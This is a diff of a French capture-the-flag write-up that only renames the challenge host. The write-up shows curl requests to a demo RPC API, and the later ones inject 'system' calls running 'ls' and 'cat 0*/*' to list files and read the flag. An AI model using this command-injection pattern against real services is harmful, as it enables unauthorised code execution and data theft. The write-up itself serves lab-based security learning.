@@ -28,7 +28,7 @@
 Un exemple d'appel à cette api est :
 
 ```
-$> curl -X POST 'http://challs.lab.algosecu.re:40006/demo-rpc/' --data-raw 
+$> curl -X POST 'http://challs:40006/demo-rpc/' --data-raw 
 '{ "api" : "Greeting", "func": "welcome", "args": [ "Chuck" ] }'
 ```
 
@@ -136,7 +136,7 @@ Maintenant il ne reste plus qu'à utiliser les bons paramètres :
 Flag :
 
 ```
-$> curl -X POST 'http://challs.lab.algosecu.re:40006/demo-rpc/' --data-raw 
+$> curl -X POST 'http://challs:40006/demo-rpc/' --data-raw 
 '{ "api" : [ "foo" ], "func": "sHuTdOwN_function", "args": ["system", "ls"] }'
 
 {
@@ -147,7 +147,7 @@ demo-rpc
 front
 html
 
-$> curl -X POST 'http://challs.lab.algosecu.re:40006/demo-rpc/' --data-raw 
+$> curl -X POST 'http://challs:40006/demo-rpc/' --data-raw 
 '{ "api" : [ "foo" ], "func": "sHuTdOwN_function", "args": ["system", "cat 0*/*"] }'
 
 {
